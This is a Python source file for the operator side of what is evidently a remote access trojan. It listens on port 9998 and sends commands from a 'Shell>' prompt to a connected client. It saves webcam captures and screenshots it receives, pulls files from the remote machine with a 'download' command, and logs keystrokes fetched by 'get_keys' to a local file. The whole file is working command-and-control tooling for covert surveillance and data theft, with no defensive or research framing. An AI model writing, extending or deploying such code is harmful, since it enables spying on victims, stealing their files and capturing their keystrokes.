import socket
import struct
import os
import time

# --- Configuration ---
HOST_IP = "0.0.0.0"
HOST_PORT = 9998


def recv_data(sock):
    """ Reads size-prefixed data frames over TCP socket """
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]

        data = b''
        while len(data) < msglen:
            packet = sock.recv(4096)
            if not packet: break
            data += packet
        return data
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None


def generate_filename(base_name, extension):
    """ Generates a timestamped unique filename """
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    return f"{base_name}_{timestamp}.{extension}"


def is_image(data):
    """ Dynamic payload verification (PNG/JPG header check) """
    # Validate PNG magic bytes (\x89PNG\r\n\x1a\n)
    if data.startswith(b'\x89PNG\r\n\x1a\n'):
        return "png"
    # Validate JPEG magic bytes (\xff\xd8\xff)
    if data.startswith(b'\xff\xd8\xff'):
        return "jpg"
    return None


# --- Server Initialization ---
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((HOST_IP, HOST_PORT))
server_socket.listen(1)

print(f"[*] Server is listening on {HOST_IP}:{HOST_PORT}...")

client_socket, client_address = server_socket.accept()
print(f"[+] New Connection from: {client_address}")

while True:
    try:
        command = input("Shell> ")
        if not command.strip(): continue

        client_socket.send(command.encode())

        if command.lower() == "exit":
            break

        # --- Response Handler ---
        print("[*] Waiting for response...")
        response_data = recv_data(client_socket)

        if not response_data:
            print("[-] Empty response or connection lost.")
            continue

        # --- Dynamic Payload Processing ---

        # 1. Error check
        if response_data.startswith(b"Error") or response_data.startswith(b"ERR") or response_data.startswith(b"[-]"):
            print(f"[-] Client Error: {response_data.decode(errors='ignore')}")
            continue

        # 2. Frame type verification
        image_type = is_image(response_data)

        if image_type:
            # Auto-save image buffer based on requested command
            prefix = "webcam" if "cam" in command.lower() else "screenshot"
            filename = generate_filename(prefix, image_type)

            with open(filename, "wb") as f:
                f.write(response_data)
            print(f"[+] Image detected and saved: {filename}")

        # 3. File extraction check (Download)
        elif command.lower().startswith("download "):
            filename = os.path.basename(command[9:].strip())
            if not filename: filename = generate_filename("download", "bin")
            with open(filename, "wb") as f:
                f.write(response_data)
            print(f"[+] File downloaded: {filename}")

        # 4. Default string/terminal decoding
        else:
            try:
                print(response_data.decode(errors='ignore'))

                # Local keylogger backup
                if command.lower() == "get_keys":
                    with open("keylog_history.txt", "a", encoding="utf-8") as f:
                        f.write(f"\n--- [{time.ctime()}] ---\n{response_data.decode(errors='ignore')}\n")
            except:
                print(f"[!] Received unknown binary data ({len(response_data)} bytes)")

    except Exception as e:
        print(f"[-] Server Error: {e}")
        break

client_socket.close()
server_socket.close()
